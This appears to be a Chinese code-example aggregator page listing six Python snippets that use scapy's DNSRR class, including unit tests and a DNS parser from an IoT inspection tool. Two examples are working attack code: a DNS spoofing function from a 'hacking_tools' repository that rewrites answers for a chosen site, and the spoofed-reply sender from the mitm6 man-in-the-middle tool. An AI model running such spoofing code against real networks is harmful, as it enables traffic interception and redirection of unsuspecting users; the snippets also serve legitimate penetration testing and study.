@@ -1,0 +1,243 @@
+示例1: test_single_dns_resp_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DNSRR [as 别名]
+def test_single_dns_resp_packet():
+
+    packets = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1"))
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 1
+
+    assert events[0]["src_mac"] == "ab:ab:ab:ab:ab:ab"
+    assert events[0]["dst_mac"] == "12:12:12:12:12:12"
+    assert events[0]["src_ip"] == "127.0.0.1"
+    assert events[0]["dst_ip"] == "192.168.1.1"
+    assert events[0]["sport"] == 80
+    assert events[0]["dport"] == 53
+    assert events[0]["qname"] == "google.com."
+    assert events[0]["qanswer"] == "123.0.0.1"
+    assert events[0]["qtype"] == "A"
+    assert events[0]["event_type"] == "DNS" 
+开发者ID:yampelo，项目名称:beagle，代码行数:24，代码来源:test_pcap.py
+
+
+
+ 
+示例2: test_multiple_packets
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DNSRR [as 别名]
+def test_multiple_packets():
+    packets = [
+        # HTTP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
+        # DNS Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
+        # TCP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355),
+    ]
+
+    events = list(packets_to_datasource_events(packets).events())
+    assert len(events) == 3
+
+    assert [e["event_type"] for e in events] == ["HTTPRequest", "DNS", "TCP"] 
+开发者ID:yampelo，项目名称:beagle，代码行数:25，代码来源:test_pcap.py
+
+
+示例3: spoof_packet
+​ 点赞 6 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DNSRR [as 别名]
+def spoof_packet(packet):
+    options = get_arguments()
+    dns_packet = scapy.IP(packet.get_payload())
+    if dns_packet.haslayer(scapy.DNSRR):
+        qname = dns_packet[scapy.DNSQR].qname
+        if options.website in qname:
+            dns_responce = scapy.DNSRR(rrname=qname, rdata=options.ip)
+            dns_packet[scapy.DNS].an = dns_responce
+            dns_packet[scapy.DNS].ancount = 1
+
+            del dns_packet[scapy.IP].len
+            del dns_packet[scapy.IP].chksum
+            del dns_packet[scapy.UDP].len
+            del dns_packet[scapy.UDP].chksum
+
+            packet.set_payload(str(dns_packet))
+    packet.accept() 
+开发者ID:mpostument，项目名称:hacking_tools，代码行数:19，代码来源:dns_spoof.py
+
+
+
+ 
+示例4: test_from_datasources
+​ 点赞 5 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DNSRR [as 别名]
+def test_from_datasources():
+    packets_1 = [
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com")
+    ]
+
+    packets_2 = [
+        # HTTP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=12345, dport=80)
+        / HTTP()
+        / HTTPRequest(Method="GET", Path="/foo", Host="https://google.com"),
+        # DNS Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / UDP(sport=80, dport=53)
+        / DNS(rd=1, qd=DNSQR(qtype="A", qname="google.com"), an=DNSRR(rdata="123.0.0.1")),
+        # TCP Packet
+        Ether(src="ab:ab:ab:ab:ab:ab", dst="12:12:12:12:12:12")
+        / IP(src="127.0.0.1", dst="192.168.1.1")
+        / TCP(sport=80, dport=5355),
+    ]
+
+    nx = NetworkX.from_datasources(
+        [packets_to_datasource_events(packets) for packets in [packets_1, packets_2]]
+    )
+
+    # Make the graph
+    nx.graph()
+
+    assert not nx.is_empty() 
+开发者ID:yampelo，项目名称:beagle，代码行数:37，代码来源:test_networkx.py
+
+
+示例5: _process_dns
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DNSRR [as 别名]
+def _process_dns(self, pkt):
+
+        src_mac = pkt[sc.Ether].src
+        dst_mac = pkt[sc.Ether].dst
+
+        src_ip = pkt[sc.IP].src
+        dst_ip = pkt[sc.IP].dst
+
+        # Find device ID
+        if pkt[sc.DNS].qr == 0:
+            # DNS request
+            if dst_mac == self._host_state.host_mac:
+                device_mac = src_mac
+                resolver_ip = dst_ip
+            else:
+                return
+        else:
+            # DNS response
+            if src_mac == self._host_state.host_mac:
+                device_mac = dst_mac
+                resolver_ip = src_ip
+            else:
+                return
+
+        device_id = utils.get_device_id(device_mac, self._host_state)
+
+        # Parse domain
+        try:
+            domain = pkt[sc.DNSQR].qname.decode('utf-8').lower()
+        except Exception:
+            return
+
+        # Remove trailing dot from domain
+        if domain[-1] == '.':
+            domain = domain[0:-1]
+
+        # Parse DNS response
+        ip_set = set()
+        if sc.DNSRR in pkt and pkt[sc.DNS].an:
+            for ix in range(pkt[sc.DNS].ancount):
+                # Extracts A-records
+                if pkt[sc.DNSRR][ix].type == 1:
+                    # Extracts IPv4 addr in A-record
+                    ip = pkt[sc.DNSRR][ix].rdata
+                    if utils.is_ipv4_addr(ip):
+                        ip_set.add(ip)
+
+        with self._host_state.lock:
+            dns_key = (device_id, domain, resolver_ip, 0)
+            current_ip_set = self._host_state \
+                .pending_dns_dict.setdefault(dns_key, set())
+            ip_set = ip_set | current_ip_set
+            self._host_state.pending_dns_dict[dns_key] = ip_set 
+开发者ID:noise-lab，项目名称:iot-inspector-client，代码行数:55，代码来源:packet_processor.py
+
+
+
+ 
+示例6: send_dns_reply
+​ 点赞 4 ​
+# 需要导入模块: from scapy import all [as 别名]
+# 或者: from scapy.all import DNSRR [as 别名]
+def send_dns_reply(p):
+    if IPv6 in p:
+        ip = p[IPv6]
+        resp = Ether(dst=p.src, src=p.dst)/IPv6(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
+    else:
+        ip = p[IP]
+        resp = Ether(dst=p.src, src=p.dst)/IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
+    dns = p[DNS]
+    #only reply to IN, and to messages that dont contain answers
+    if dns.qd.qclass != 1 or dns.qr != 0:
+        return
+    #Make sure the requested name is in unicode here
+    reqname = dns.qd.qname.decode()
+    #A request
+    if dns.qd.qtype == 1:
+        rdata = config.selfipv4
+    #AAAA request
+    elif dns.qd.qtype == 28:
+        rdata = config.selfaddr
+    #PTR request
+    elif dns.qd.qtype == 12:
+        # To reply for PTR requests for our own hostname
+        # comment the return statement
+        return
+        if reqname == config.selfptr:
+            #We reply with attacker.domain
+            rdata = 'attacker.%s' % config.localdomain
+        else:
+            return
+    #Not handled
+    else:
+        return
+    if should_spoof_dns(reqname):
+        resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=dns.qd.qtype))
+        try:
+            sendp(resp, iface=config.default_if, verbose=False)
+        except socket.error as e:
+            print('Error sending spoofed DNS')
+            print(e)
+            if config.debug:
+                ls(resp)
+        print('Sent spoofed reply for %s to %s' % (reqname, ip.src))
+    else:
+        if config.verbose or config.debug:
+            print('Ignored query for %s from %s' % (reqname, ip.src))
+
+# Helper function to check whether any element in the list "matches" value 
+开发者ID:fox-it，项目名称:mitm6，代码行数:49，代码来源:mitm6.py
